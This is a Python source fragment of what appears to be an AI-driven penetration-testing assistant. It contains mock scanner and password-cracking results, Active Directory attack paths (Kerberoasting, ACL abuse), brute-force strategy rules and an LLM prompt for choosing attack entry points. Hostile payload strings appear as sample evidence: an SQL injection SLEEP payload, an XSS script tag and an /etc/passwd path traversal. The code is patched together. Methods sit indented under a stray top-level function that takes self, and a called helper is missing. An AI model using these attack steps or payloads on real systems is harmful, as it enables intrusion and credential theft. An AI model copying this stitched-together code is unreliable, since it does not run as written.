                    'packets': 1842,
                    'bytes': 145234,
                    'protocols': ['TCP', 'UDP']
                },
                {
                    'source': '10.0.0.5',
                    'destination': '192.168.1.100',
                    'packets': 1523,
                    'bytes': 98234,
                    'protocols': ['SMB', 'TCP']
                }
            ],
            'suspicious_traffic': {
                'port_scans': [
                    {
                        'source': '45.33.22.11',
                        'target': '192.168.1.100',
                        'ports': [22, 80, 443, 445, 3389],
                        'type': 'SYN scan',
                        'timestamp': '2024-01-15T10:23:45Z',
                        'confidence': 0.95
                    }
                ],
                'brute_force_attempts': [
                    {
                        'source': '78.45.12.67',
                        'target': '192.168.1.100',
                        'service': 'SSH',
                        'attempts': 1523,
                        'timestamp': '2024-01-15T10:25:30Z',
                        'confidence': 0.98
                    }
                ]
            },
            'unencrypted_credentials': [
                {
                    'packet': 2345,
                    'protocol': 'FTP',
                    'source': '192.168.1.105',
                    'destination': '10.0.0.10',
                    'username': 'ftpuser',
                    'password': 'ftp123',
                    'timestamp': '2024-01-15T10:24:30Z',
                    'confidence': 1.0
                },
                {
                    'packet': 4567,
                    'protocol': 'HTTP',
                    'source': '192.168.1.110',
                    'destination': '192.168.1.100',
                    'url': '/login',
                    'credentials': 'admin:admin123',
                    'timestamp': '2024-01-15T10:26:45Z',
                    'confidence': 1.0
                }
            ]
        }

    @staticmethod
    def aircrack_ng(capture_file: str, wordlist: str = 'rockyou.txt') -> Dict[str, Any]:
        """Aircrack-ng WiFi cracking"""
        return {
            'success': True,
            'tool': 'aircrack-ng',
            'capture_file': capture_file,
            'wordlist': wordlist,
            'scan_time': datetime.utcnow().isoformat(),
            'handshakes': [
                {'bssid': '00:11:22:33:44:55', 'essid': 'TestNetwork', 'channel': 6},
                {'bssid': 'AA:BB:CC:DD:EE:FF', 'essid': 'GuestWiFi', 'channel': 11}
            ],
            'keys': [
                {'essid': 'TestNetwork', 'key': 'password123', 'method': 'WPA2'}
            ],
            'summary': {
                'handshakes_captured': 2,
                'keys_cracked': 1,
                'time_elapsed': '3 minutes 45 seconds'
            }
        }

    @staticmethod
    def john_the_ripper(hash_file: str, format: str = 'raw-md5') -> Dict[str, Any]:
        """John the Ripper password cracker"""
        return {
            'success': True,
            'tool': 'john',
            'hash_file': hash_file,
            'hash_type': format,
            'scan_time': datetime.utcnow().isoformat(),
            'summary': {
                'total_hashes': 5,
                'cracked': 3,
                'failed': 2,
                'time_elapsed': '2 minutes 34 seconds',
                'attempts': 45231
            },
            'cracked_passwords': [
                {
                    'hash': '5f4dcc3b5aa765d61d8327deb882cf99',
                    'password': 'password123',
                    'username': 'admin',
                    'type': 'MD5',
                    'time': '15 seconds',
                    'method': 'dictionary'
                },
                {
                    'hash': '7c6a180b36896a0a8c02787eeafb0e4c',
                    'password': 'qwerty2024',
                    'username': 'user1',
                    'type': 'MD5',
                    'time': '45 seconds',
                    'method': 'dictionary'
                },
                {
                    'hash': '$2y$10$N9qo8uLOickgx2ZMRZoMy.Mr/9xK3cGQ5CJFQMzV0JxGZ8vQ9xqZq',
                    'password': 'admin@123',
                    'username': 'root',
                    'type': 'bcrypt',
                    'time': '1 minute 34 seconds',
                    'method': 'hybrid'
                }
            ],
            'statistics': {
                'words_per_second': 8500,
                'crack_rate': '60%',
                'top_passwords': ['password123', 'qwerty2024', 'admin@123']
            }
        }

    @staticmethod
    def burp_scan(target: str, scan_type: str = 'active') -> Dict[str, Any]:
        """Burp Suite scanner"""
        return {
            'success': True,
            'tool': 'burpsuite',
            'target': target,
            'scan_type': scan_type,
            'scan_time': datetime.utcnow().isoformat(),
            'summary': {
                'total_issues': 24,
                'critical': 3,
                'high': 5,
                'medium': 8,
                'low': 5,
                'info': 3,
                'scan_duration': '3 minutes 22 seconds',
                'requests_made': 1523
            },
            'issues': [
                {
                    'id': '1',
                    'name': 'SQL Injection',
                    'severity': 'CRITICAL',
                    'confidence': 'Certain',
                    'path': '/api/products',
                    'method': 'POST',
                    'parameter': 'id',
                    'type': 'Time-based blind SQL injection',
                    'description': 'The application is vulnerable to time-based blind SQL injection',
                    'evidence': 'Response delayed by 5 seconds with payload: \' OR SLEEP(5)--',
                    'remediation': 'Use parameterized queries with prepared statements',
                    'cwe': 89,
                    'wascc': 19
                },
                {
                    'id': '2',
                    'name': 'Cross-Site Scripting (XSS)',
                    'severity': 'HIGH',
                    'confidence': 'Certain',
                    'path': '/search',
                    'method': 'GET',
                    'parameter': 'q',
                    'type': 'Reflected XSS',
                    'description': 'Reflected XSS vulnerability in search parameter',
                    'evidence': 'Alert box popped up with <script>alert(1)</script>',
                    'remediation': 'Implement proper output encoding and CSP',
                    'cwe': 79,
                    'wascc': 8
                },
                {
                    'id': '3',
                    'name': 'Cross-Site Request Forgery (CSRF)',
                    'severity': 'MEDIUM',
                    'confidence': 'Firm',
                    'path': '/change-password',
                    'method': 'POST',
                    'description': 'No CSRF tokens present in password change form',
                    'evidence': 'Request succeeds without CSRF token',
                    'remediation': 'Implement anti-CSRF tokens',
                    'cwe': 352
                },
                {
                    'id': '4',
                    'name': 'Path Traversal',
                    'severity': 'HIGH',
                    'confidence': 'Certain',
                    'path': '/download',
                    'method': 'GET',
                    'parameter': 'file',
                    'type': 'File path traversal',
                    'description': 'Path traversal vulnerability in file download parameter',
                    'evidence': 'Successfully retrieved /etc/passwd with ../../../etc/passwd',
                    'remediation': 'Validate and sanitize file paths',
                    'cwe': 22
                },
                {
                    'id': '5',
                    'name': 'Insecure Direct Object References (IDOR)',
                    'severity': 'HIGH',
                    'confidence': 'Certain',
                    'path': '/api/user/123',
                    'method': 'GET',
                    'description': 'Horizontal privilege escalation possible',
                    'evidence': 'Accessing /api/user/124 returns another user\'s data',
                    'remediation': 'Implement proper access controls',
                    'cwe': 639
                }
            ]
        }

    @staticmethod
    def gobuster_dir(target: str, wordlist: str = 'common.txt') -> Dict[str, Any]:
        """Gobuster directory enumeration"""
        return {
            'success': True,
            'tool': 'gobuster',
            'target': target,
            'wordlist': wordlist,
            'scan_time': datetime.utcnow().isoformat(),
            'summary': {
                'total_directories': 15,
                'time_elapsed': '1 minute 23 seconds'
            },
            'directories': [
                '/admin', '/wp-admin', '/backup', '/uploads', '/images',
                '/css', '/js', '/api', '/v1', '/docs', '/phpmyadmin',
                '/server-status', '/.git', '/config', '/install'
            ],
            'status_codes': {
                '200': ['/admin', '/uploads', '/images'],
                '403': ['/wp-admin', '/phpmyadmin'],
                '301': ['/api', '/v1'],
                '500': ['/install']
            }
        }

    @staticmethod
    def wpscan(target: str) -> Dict[str, Any]:
        """WordPress vulnerability scanner"""
        return {
            'success': True,
            'tool': 'wpscan',
            'target': target,
            'scan_time': datetime.utcnow().isoformat(),
            'summary': {
                'version': '5.8.3',
                'themes': 2,
                'plugins': 8,
                'users': 5,
                'vulnerabilities': 7
            },
            'vulnerabilities': [
                {'name': 'WordPress 5.8.3 - Multiple Vulnerabilities', 'type': 'core', 'severity': 'CRITICAL'},
                {'name': 'Plugin: contact-form-7 5.4 - XSS', 'type': 'plugin', 'severity': 'HIGH'},
                {'name': 'Plugin: wordfence 7.5.5 - SQL Injection', 'type': 'plugin', 'severity': 'CRITICAL'},
                {'name': 'Theme: twentytwentyone 1.4 - XSS', 'type': 'theme', 'severity': 'MEDIUM'}
            ],
            'users': [
                {'username': 'admin', 'id': 1, 'role': 'administrator'},
                {'username': 'editor', 'id': 2, 'role': 'editor'},
                {'username': 'author', 'id': 3, 'role': 'author'}
            ],
            'plugins': [
                {'name': 'contact-form-7', 'version': '5.4', 'status': 'active'},
                {'name': 'wordfence', 'version': '7.5.5', 'status': 'active'},
                {'name': 'woocommerce', 'version': '5.9.0', 'status': 'active'},
                {'name': 'jetpack', 'version': '10.5', 'status': 'inactive'}
            ],
            'themes': [
                {'name': 'twentytwentyone', 'version': '1.4', 'status': 'active'},
                {'name': 'twentytwenty', 'version': '1.8', 'status': 'inactive'}
            ]
        }

    @staticmethod
    def bloodhound_ad_map(domain: str, username: str = None) -> Dict[str, Any]:
        """BloodHound - Active Directory attack path mapping"""
        return {
            'success': True,
            'tool': 'bloodhound',
            'domain': domain,
            'username': username or 'anonymous',
            'scan_time': datetime.utcnow().isoformat(),
            'summary': {
                'total_users': 156,
                'total_computers': 78,
                'total_groups': 23,
                'total_sessions': 89,
                'attack_paths': 12,
                'high_value_targets': 5
            },
            'nodes': [
                {
                    'id': 'DC01',
                    'type': 'computer',
                    'name': 'DC01.CORP.LOCAL',
                    'properties': {
                        'operating_system': 'Windows Server 2019',
                        'enabled': True,
                        'highvalue': True,
                        'sessions': ['Administrator', 'SYSTEM']
                    }
                },
                {
                    'id': 'SQL01',
                    'type': 'computer',
                    'name': 'SQL01.CORP.LOCAL',
                    'properties': {
                        'operating_system': 'Windows Server 2016',
                        'enabled': True,
                        'highvalue': True,
                        'sessions': ['sql_svc']
                    }
                },
                {
                    'id': 'ADMIN',
                    'type': 'user',
                    'name': 'ADMINISTRATOR@CORP.LOCAL',
                    'properties': {
                        'enabled': True,
                        'highvalue': True,
                        'admincount': True,
                        'lastlogon': '2024-01-15T10:30:00Z'
                    }
                },
                {
                    'id': 'SQLSVC',
                    'type': 'user',
                    'name': 'sql_svc@CORP.LOCAL',
                    'properties': {
                        'enabled': True,
                        'highvalue': True,
                        'admincount': False,
                        'lastlogon': '2024-01-15T08:45:00Z'
                    }
                }
            ],
            'edges': [
                {
                    'from': 'ADMIN',
                    'to': 'DC01',
                    'type': 'AdminTo',
                    'properties': {
                        'confidence': 1.0,
                        'isacl': False
                    }
                },
                {
                    'from': 'SQLSVC',
                    'to': 'SQL01',
                    'type': 'AdminTo',
                    'properties': {
                        'confidence': 1.0,
                        'isacl': False
                    }
                },
                {
                    'from': 'SQL01',
                    'to': 'DC01',
                    'type': 'CanRDP',
                    'properties': {
                        'confidence': 0.8,
                        'port': 3389
                    }
                }
            ],
            'attack_paths': [
                {
                    'id': 'path1',
                    'name': 'Kerberoasting Attack Path',
                    'target': 'SQLSVC',
                    'description': 'Service account SQLSVC is kerberoastable with admin rights to SQL01',
                    'steps': [
                        'Enumerate SPNs to find kerberoastable accounts',
                        'Request TGS ticket for SQLSVC',
                        'Offline brute force TGS ticket',
                        'Access SQL01 as SQLSVC',
                        'RDP from SQL01 to DC01'
                    ],
                    'tools': ['Rubeus', 'GetUserSPNs', 'hashcat'],
                    'probability': 0.85
                },
                {
                    'id': 'path2',
                    'name': 'ACL Exploitation Path',
                    'target': 'ADMIN',
                    'description': 'GenericAll privilege on ADMIN user allows password reset',
                    'steps': [
                        'Compromise low-privilege account',
                        'Modify ADMIN user password via ACL abuse',
                        'Authenticate as ADMINISTRATOR',
                        'Take full control of domain'
                    ],
                    'tools': ['PowerView', 'SharpHound'],
                    'probability': 0.75
                }
            ],
            'critical_findings': [
                {
                    'name': 'Kerberoastable Service Accounts',
                    'accounts': ['SQLSVC', 'IIS_SVC'],
                    'severity': 'CRITICAL',
                    'mitigation': 'Use managed service accounts (gMSA)'
                },
                {
                    'name': 'SMB Signing Disabled',
                    'computers': ['WEB01', 'SQL01'],
                    'severity': 'HIGH',
                    'mitigation': 'Enable SMB signing on all computers'
                }
            ],
            'recommendations': [
                'Implement tiered administration model',
                'Disable unnecessary service accounts',
                'Enable SMB signing on all systems',
                'Implement LAPS for local admin passwords',
                'Monitor for suspicious ACL modifications',
                'Use group managed service accounts (gMSA)'
            ]
        }
# ==================== AI SINGLETON FOR GPU OPTIMIZATION ====================
class AISingleton:
    """Singleton class to ensure only one copy of the AI model is loaded in GPU memory"""
    _model = None
    _intelligence_engine = None
    _model_name = "all-MiniLM-L6-v2"
    _device = 'cuda' if CUDA_AVAILABLE else 'cpu'
    
    @classmethod
    def get_model(cls):
        """Get or load the AI model (loaded only once)"""
        if cls._model is None:
            print(f"\n🚀 Loading AI Model '{cls._model_name}' into {cls._device.upper()} memory...")
            try:
                from sentence_transformers import SentenceTransformer
                
                # Load model on appropriate device
                cls._model = SentenceTransformer(cls._model_name, device=cls._device)
                
                if CUDA_AVAILABLE:
                    # Warm up the model with a small inference
                    test_text = "warm up inference"
                    _ = cls._model.encode(test_text)
                    
                    # Report memory usage
                    allocated = torch.cuda.memory_allocated(0) / 1e6
                    reserved = torch.cuda.memory_reserved(0) / 1e6
                    print(f"✓ Model loaded successfully!")
                    print(f"  • Device: {cls._device.upper()}")
                    print(f"  • VRAM Used: {allocated:.1f} MB (Reserved: {reserved:.1f} MB)")
                else:
                    print(f"✓ Model loaded successfully on CPU")
                    
            except Exception as e:
                print(f"⚠ Failed to load AI model: {e}")
                print("  Using fallback mode (pattern matching only)")
                cls._model = None
        
        return cls._model
    
    @classmethod
    def get_intelligence_engine(cls):
        """Get or create the AI Intelligence Engine"""
        if cls._intelligence_engine is None:
            print("\n🧠 Initializing AI Intelligence Engine...")
            cls._intelligence_engine = IntelligenceEngine(model=cls.get_model())
            print("✓ AI Intelligence Engine ready")
        
        return cls._intelligence_engine
    
    @classmethod
    def unload_model(cls):
        """Unload model and clear GPU cache"""
        cls._model = None
        cls._intelligence_engine = None
        if CUDA_AVAILABLE:
            torch.cuda.empty_cache()
            print("🧹 AI Model unloaded, GPU cache cleared")

# ==================== AI INTELLIGENCE ENGINE MODULES ====================

class ContextBuilder:
    """Level 1-2: Context Awareness - Builds comprehensive context from scan results"""
    
    def build(self, scan_result, similar_cases=None, history=None):
        """Build rich context for AI reasoning"""
        if similar_cases is None:
            similar_cases = []
        if history is None:
            history = []
            
        return {
            "services": scan_result.get("services", []),
            "open_ports": scan_result.get("ports", []),
            "os": scan_result.get("os", "unknown"),
            "vulnerabilities": scan_result.get("vulnerabilities", []),
            "similar_cases": similar_cases,
            "previous_attempts": history,
            "target": scan_result.get("target", "unknown"),
            "scan_type": scan_result.get("scan_type", "unknown")
        }

class RuleEngine:
    """Level 6: Hybrid Intelligence - Deterministic rules baseline"""
    
    def generate_baseline(self, context):
        """Generate baseline strategies using deterministic rules"""
        strategies = []
        
        # Port-based rules
        for port in context.get("open_ports", []):
            if port == 22:
                strategies.append({
                    "type": "bruteforce",
                    "service": "ssh",
                    "description": "Check SSH weak credentials",
                    "tools": ["hydra", "medusa"],
                    "priority": "high" if port in [22, 21, 3389] else "medium"
                })
            elif port == 80 or port == 443:
                strategies.append({
                    "type": "web_scan",
                    "service": "http",
                    "description": "Check for web vulnerabilities",
                    "tools": ["nikto", "gobuster", "wpscan"],
                    "priority": "high"
                })
            elif port == 21:
                strategies.append({
                    "type": "bruteforce",
                    "service": "ftp",
                    "description": "Check FTP anonymous access and weak credentials",
                    "tools": ["hydra", "nmap"],
                    "priority": "medium"
                })
            elif port == 3306:
                strategies.append({
                    "type": "database",
                    "service": "mysql",
                    "description": "Check MySQL weak credentials and misconfigurations",
                    "tools": ["hydra", "sqlmap"],
                    "priority": "medium"
                })
        
        # Vulnerability-based rules
        for vuln in context.get("vulnerabilities", []):
            vuln_name = vuln.get("name", "").lower() if isinstance(vuln, dict) else str(vuln).lower()
            
            if "sql" in vuln_name:
                strategies.append({
                    "type": "exploitation",
                    "technique": "sql_injection",
                    "description": "Test for SQL Injection exploitation",
                    "tools": ["sqlmap"],
                    "priority": "critical"
                })
            elif "xss" in vuln_name:
                strategies.append({
                    "type": "exploitation",
                    "technique": "xss",
                    "description": "Test for Cross-Site Scripting",
                    "tools": ["beef", "xsstrike"],
                    "priority": "high"
                })
            elif "rce" in vuln_name or "remote" in vuln_name:
                strategies.append({
                    "type": "exploitation",
                    "technique": "rce",
                    "description": "Test for Remote Code Execution",
                    "tools": ["metasploit"],
                    "priority": "critical"
                })
        
        return strategies


def _init_deepseek(self):
    """Initialize DeepSeek 1.3B in 4-bit (GTX 1650 Optimized)"""

    try:
        import torch
        from transformers import (
            AutoModelForCausalLM,
            AutoTokenizer,
            BitsAndBytesConfig
        )

        if not torch.cuda.is_available():
            print("⚠ CUDA not available")
            self.deepseek_available = False
            return

        model_name = "deepseek-ai/deepseek-coder-1.3b-instruct"

        print("🚀 Loading DeepSeek 1.3B in 4-bit mode...")

        # 🔥 4-BIT CONFIG (Stable + Fast)
        quant_config = BitsAndBytesConfig(
            load_in_4bit=True,
            bnb_4bit_compute_dtype=torch.float16,   # best for GTX 1650
            bnb_4bit_use_double_quant=True,         # reduces VRAM
            bnb_4bit_quant_type="nf4"               # best quant type
        )

        self.tokenizer = AutoTokenizer.from_pretrained(
            model_name,
            trust_remote_code=True
        )

        self.deepseek_model = AutoModelForCausalLM.from_pretrained(
            model_name,
            quantization_config=quant_config,
            device_map="auto",
            torch_dtype=torch.float16,
            trust_remote_code=True
        )

        self.deepseek_model.eval()

        self.deepseek_available = True

        # 📊 Print real GPU usage
        allocated = torch.cuda.memory_allocated() / (1024 ** 2)
        reserved = torch.cuda.memory_reserved() / (1024 ** 2)

        print("✓ DeepSeek 1.3B loaded successfully (4-bit)")
        print(f"   • VRAM Allocated: {allocated:.1f} MB")
        print(f"   • VRAM Reserved : {reserved:.1f} MB")

    except Exception as e:
        print(f"⚠ DeepSeek 4-bit loading failed: {e}")
        self.deepseek_available = False
        
#________________________________________________________________________________________________________________________________________
    def _simulate_response(self, prompt):
        """Simulate LLM response when DeepSeek not available"""
        if "entry_points" in prompt:
            return {
                "entry_points": [
                    {
                        "service": "ssh",
                        "port": 22,
                        "rationale": "Common attack vector with potential for weak credentials",
                        "initial_approach": "Perform SSH brute force with common credentials"
                    },
                    {
                        "service": "http",
                        "port": 80,
                        "rationale": "Web applications often have vulnerabilities",
                        "initial_approach": "Run web vulnerability scanner"
                    }
                ]
            }
        return {"response": "Simulated response"}
    
    def _extract_json(self, text):
        """Extract JSON from LLM response"""
        import re
        json_match = re.search(r'\{.*\}', text, re.DOTALL)
        if json_match:
            try:
                return json.loads(json_match.group())
            except:
                return {}
        return {}
    
    def identify_entry_points(self, context):
        """Step 1: Identify potential entry points"""
        prompt = f"""
You are a cybersecurity AI strategist analyzing a target.

Target Context:
- Target: {context.get('target', 'unknown')}
- Open Ports: {context.get('open_ports', [])}
- Services: {context.get('services', [])}
- OS: {context.get('os', 'unknown')}
- Vulnerabilities: {len(context.get('vulnerabilities', []))} identified

Identify the top 3 most promising entry points for penetration testing.
For each entry point, provide:
- Service/port
- Why it's promising
- Initial testing approach

Return as JSON with this structure:
{{
  "entry_points": [
    {{
      "service": "service_name",
      "port": port_number,
      "rationale": "explanation",
      "initial_approach": "testing method"
    }}
  ]
}}
"""
        response = self._call_deepseek(prompt)
        if isinstance(response, dict):
            return response
        return self._extract_json(response)
    
    def evaluate_impact(self, entry_points, context):
        """Step 2: Evaluate impact of successful exploitation"""
        prompt = f"""
Evaluate the potential impact of exploiting these entry points:
{json.dumps(entry_points, indent=2)}

Target Context: {context.get('target', 'unknown')}

For each entry point, estimate:
- Potential access level gained
- Data exposure risk
- System compromise potential

Return as JSON.
"""
        response = self._call_deepseek(prompt)
        if isinstance(response, dict):
            return response
        return self._extract_json(response)
    
    def recommend_strategy(self, context, baseline, entry_analysis, impact_analysis):
        """Step 3: Recommend comprehensive strategy"""
        strategies = []
        
        # Combine baseline with analysis
        for baseline_item in baseline:
            strategies.append({
                "primary_approach": baseline_item.get("description", ""),
                "tools": baseline_item.get("tools", []),
                "priority": baseline_item.get("priority", "medium"),
                "steps": [
                    f"Run {tool} to {baseline_item.get('description', '')}"
                    for tool in baseline_item.get("tools", [])[:2]
                ]
            })
        
        # Add AI-suggested strategies based on entry points
        for entry in entry_analysis.get("entry_points", []):
            if entry.get("service") == "ssh":
                strategies.append({
                    "primary_approach": "Credential brute-forcing on SSH",
                    "tools": ["hydra", "ncrack"],
                    "priority": "high",
                    "steps": [
                        "Enumerate SSH users with metasploit",
                        "Perform dictionary attack with hydra",
                        "Check for SSH key vulnerabilities"
                    ]
                })
            elif entry.get("service") == "http":
                strategies.append({
                    "primary_approach": "Web application penetration testing",
                    "tools": ["nikto", "sqlmap", "burpsuite"],
                    "priority": "high",
                    "steps": [
                        "Run nikto for general vulnerabilities",
                        "Directory enumeration with gobuster",
                        "Test for SQL injection with sqlmap",
                        "Intercept and modify requests with burpsuite"
                    ]
                })
        
        return strategies
    
    def predict_success(self, strategy, historical_data=None):
        """Step 4: Predict success probability"""
        if not historical_data:
            return {
                "success_probability": 0.65,
                "time_estimate": "30-60 minutes",
                "difficulty": "medium",
                "risk_level": "medium"
            }
        
        # Calculate based on historical success rates
        success_count = sum(1 for h in historical_data if h.get("success", False))
        total_count = len(historical_data) if historical_data else 1
        
        return {
            "success_probability": round(success_count / total_count, 2) if total_count > 0 else 0.5,
            "time_estimate": "30-60 minutes",
            "difficulty": "medium",
            "risk_level": "medium"
        }
    
    def critique_strategy(self, strategy):
        """Level 4: Self-Critique - Identify weaknesses in strategy"""
        critique = {
            "weaknesses": [],
            "strengths": [],
            "improvement_suggestions": []
        }
        
        for s in strategy:
            # Check for common weaknesses
            if "bruteforce" in s.get("primary_approach", "").lower():
                if not any("rate limiting" in step.lower() for step in s.get("steps", [])):
                    critique["weaknesses"].append(f"Strategy for {s.get('primary_approach')} doesn't account for rate limiting")
                    critique["improvement_suggestions"].append("Add rate limiting detection and adaptive delays")
            
            if "web" in s.get("primary_approach", "").lower():
                if len(s.get("tools", [])) < 2:
                    critique["weaknesses"].append(f"Web strategy uses limited toolset")
                    critique["improvement_suggestions"].append("Combine multiple tools for comprehensive coverage")
            
            critique["strengths"].append(f"Good tool selection for {s.get('primary_approach')}")
        
        return critique
    
    def refine_strategy(self, original_strategy, critique):
        """Level 4: Strategy refinement based on critique"""
        refined = []
        
        for i, strategy in enumerate(original_strategy):
            refined_strategy = strategy.copy()
            
            # Apply improvements based on critique
            if i < len(critique.get("improvement_suggestions", [])):
                refined_strategy["steps"].append(critique["improvement_suggestions"][i])
            
            refined.append(refined_strategy)
        
        return refined

class RiskPredictor:
    """Level 7: Adaptive Learning - Risk prediction based on historical data"""
    
    def __init__(self):
        self.global_success_rate = 0.5
        self.tool_success_rates = {}
        self.vulnerability_success_rates = {}
        
    def update_from_feedback(self, feedback_records):
        """Update success rates based on user feedback"""
        if not feedback_records:
            return
        
        # Update global rate
        successes = [r for r in feedback_records if r.get("actual_outcome") == "success"]
        self.global_success_rate = len(successes) / len(feedback_records) if feedback_records else 0.5
        
        # Update tool rates
        tool_stats = {}
        for record in feedback_records:
            tool = record.get("tool_used")
            if tool:
                if tool not in tool_stats:
                    tool_stats[tool] = {"success": 0, "total": 0}
                tool_stats[tool]["total"] += 1
                if record.get("actual_outcome") == "success":
                    tool_stats[tool]["success"] += 1
        
        for tool, stats in tool_stats.items():
            self.tool_success_rates[tool] = stats["success"] / stats["total"] if stats["total"] > 0 else 0.5
    
    def predict(self, severity, tool=None, vulnerability_type=None):
        """Predict success probability with confidence"""
        base_map = {
            "low": 0.3,
            "medium": 0.5,
            "high": 0.7,
            "critical": 0.8
        }
        
        severity_score = base_map.get(severity.lower(), 0.5)
        
        # Adjust based on tool success rate if available
        tool_factor = self.tool_success_rates.get(tool, 0.5) if tool else 0.5
        
        # Adjust based on vulnerability type
        vuln_factor = self.vulnerability_success_rates.get(vulnerability_type, 0.5) if vulnerability_type else 0.5
        
        # Weighted combination
        prediction = (
            severity_score * 0.4 +
            tool_factor * 0.3 +
            vuln_factor * 0.2 +
            self.global_success_rate * 0.1
        )
        
        return round(min(prediction, 0.95), 2)

class ConfidenceCalibrator:
    """Level 3-4: Dynamic Confidence Calibration"""
    
    def calibrate(self, similarity_score, historical_rate, model_conf, uncertainty_factor=1.0):
        """Calculate calibrated confidence score"""
        confidence = (
            similarity_score * 0.3 +
            historical_rate * 0.3 +
            model_conf * 0.2 +
            (1 - uncertainty_factor) * 0.2
        )
        
        # Level 8: Uncertainty Awareness
        if uncertainty_factor < 0.6:  # High uncertainty
            confidence *= 0.7
        
        return round(min(confidence, 0.95), 2)
    
    def calculate_uncertainty(self, context, similar_cases_count):
        """Calculate uncertainty based on available information"""
        factors = []
        
        # Less information = more uncertainty
        if len(context.get("vulnerabilities", [])) == 0:
            factors.append(0.3)
        else:
            factors.append(0.1)
        
        # Fewer similar cases = more uncertainty
        if similar_cases_count < 2:
            factors.append(0.3)
        elif similar_cases_count < 5:
            factors.append(0.2)
        else:
            factors.append(0.1)
        
        # New/unknown services = more uncertainty
        unknown_services = sum(1 for s in context.get("services", []) if "unknown" in s.lower())
        factors.append(min(0.3, unknown_services * 0.1))
        
        return min(1.0, sum(factors))

class AttackGraphBuilder:
    """Level 5: Graph-Based Attack Reasoning"""
    
    def build_graph(self, strategies, vulnerabilities, services):
        """Build attack graph from strategies and vulnerabilities"""
        graph = {
            "nodes": [],
            "edges": [],
            "paths": []
        }
        
        # Add initial node
        graph["nodes"].append({
            "id": "initial",
            "type": "state",
            "label": "Initial Access",
            "privilege": "none"
        })
        
        # Add service nodes
        for service in services:
            node_id = f"service_{service.get('name', 'unknown')}"
            graph["nodes"].append({
                "id": node_id,
                "type": "service",
                "label": f"Service: {service.get('name', 'unknown')}",
                "port": service.get("port", 0)
            })
            
            # Connect initial to services
            graph["edges"].append({
                "from": "initial",
                "to": node_id,
                "label": "scan"
            })
        
        # Add vulnerability nodes and exploitation paths
        for vuln in vulnerabilities:
            vuln_name = vuln.get("name", "unknown") if isinstance(vuln, dict) else str(vuln)
            node_id = f"vuln_{hash(vuln_name) % 10000}"
            
            graph["nodes"].append({
                "id": node_id,
                "type": "vulnerability",
                "label": f"Vuln: {vuln_name}",
                "severity": vuln.get("severity", "medium") if isinstance(vuln, dict) else "medium"
            })
            
            # Connect to related service
            for service in services:
                if service.get("name") in vuln_name.lower():
                    graph["edges"].append({
                        "from": f"service_{service.get('name')}",
                        "to": node_id,
                        "label": "has_vulnerability"
                    })
        
        # Add strategy paths
        for i, strategy in enumerate(strategies):
            path_id = f"path_{i}"
            path_nodes = [("initial", 0)]
            
            for j, step in enumerate(strategy.get("steps", [])[:3]):
                step_node = {
                    "id": f"step_{i}_{j}",
                    "type": "action",
                    "label": step[:30] + "..." if len(step) > 30 else step,
                    "tool": strategy.get("tools", [j]) if j < len(strategy.get("tools", [])) else "unknown"
                }
                graph["nodes"].append(step_node)
                path_nodes.append((step_node["id"], j+1))
            
            # Add success node
            success_node = {
                "id": f"success_{i}",
                "type": "success",
                "label": f"Success: {strategy.get('primary_approach', 'exploit')[:30]}"
            }
            graph["nodes"].append(success_node)
            
            # Connect path
            for k in range(len(path_nodes)-1):
                graph["edges"].append({
                    "from": path_nodes[k][0],
                    "to": path_nodes[k+1][0],
                    "label": f"step {k+1}"
                })
            
            # Connect last step to success
            if path_nodes:
                graph["edges"].append({
                    "from": path_nodes[-1][0],
                    "to": success_node["id"],
                    "label": "exploit"
                })
            
            # Calculate path score
            path_score = self._calculate_path_score(strategy, vulnerabilities)
            graph["paths"].append({
                "id": path_id,
                "nodes": [n[0] for n in path_nodes] + [success_node["id"]],
                "score": path_score,
                "description": strategy.get("primary_approach", "")
            })
        
        return graph
    
    def _calculate_path_score(self, strategy, vulnerabilities):
        """Calculate score for attack path"""
        severity_weights = {
            "critical": 0.9,
            "high": 0.7,
            "medium": 0.5,
            "low": 0.3
        }
        
        # Base score from strategy priority
        priority_map = {"critical": 0.9, "high": 0.7, "medium": 0.5, "low": 0.3}
        base_score = priority_map.get(strategy.get("priority", "medium"), 0.5)
        
        # Adjust based on vulnerabilities
        vuln_score = 0
        if vulnerabilities:
            for vuln in vulnerabilities[:3]:
                severity = vuln.get("severity", "medium") if isinstance(vuln, dict) else "medium"
                vuln_score = max(vuln_score, severity_weights.get(severity.lower(), 0.5))
        
        # Combined score
        return round((base_score * 0.4 + vuln_score * 0.6), 2)

class LearningManager:
    """Level 7: Adaptive Learning - Store and retrieve learning data"""
    
    def __init__(self):
        self.learning_data = {
            "tool_success_rates": {},
            "vulnerability_patterns": {},
            "service_exploit_map": {},
            "user_feedback": []
        }
    
    def store_feedback(self, db, user_id, scan_id, attack_id, feedback_data):
        """Store user feedback for learning"""
        feedback_record = {
            "user_id": user_id,
            "scan_id": scan_id,
            "attack_id": attack_id,
            "feedback": feedback_data,
            "timestamp": datetime.utcnow().isoformat()
        }
        
        # Update in-memory learning data
        self.learning_data["user_feedback"].append(feedback_record)
        
        # Update tool success rates
        tool = feedback_data.get("tool_used")
        if tool:
            if tool not in self.learning_data["tool_success_rates"]:
                self.learning_data["tool_success_rates"][tool] = {"success": 0, "total": 0}
            
            self.learning_data["tool_success_rates"][tool]["total"] += 1
            if feedback_data.get("success"):
                self.learning_data["tool_success_rates"][tool]["success"] += 1
        
        return True
    
    def get_learning_stats(self):
        """Get aggregated learning statistics"""
        stats = {
            "tool_stats": {},
            "total_feedback": len(self.learning_data["user_feedback"])
        }
        
        for tool, data in self.learning_data["tool_success_rates"].items():
            if data["total"] > 0:
                stats["tool_stats"][tool] = {
                    "success_rate": round(data["success"] / data["total"], 2),
                    "attempts": data["total"]
                }
        
        return stats
# Add this before class IntelligenceEngine
class LLMReasoner:
    """Level 3-5: LLM-based Reasoning & Planning"""
    def __init__(self, model):
        self.model = model
        
    def reason(self, context: Dict[str, Any]) -> Dict[str, Any]:
        """Base reasoning logic"""
        # Logic for processing context and returning strategies
        return {"thought_process": "Analyzing context...", "confidence": 0.85}

class IntelligenceEngine:
    """Master AI Engine combining all intelligence layers"""
    
    def __init__(self, model=None):
        self.context_builder = ContextBuilder()
        self.rule_engine = RuleEngine()
        self.llm_reasoner = LLMReasoner(model)
        self.risk_predictor = RiskPredictor()
        self.confidence_calibrator = ConfidenceCalibrator()
        self.graph_builder = AttackGraphBuilder()
        self.learning_manager = LearningManager()
        self.vector_store = None  # Will be initialized if available
        print("✓ Intelligence Engine Modules Initialized")
        
        
    def set_vector_store(self, vector_store):
        """Set vector store for RAG"""
        self.vector_store = vector_store
    
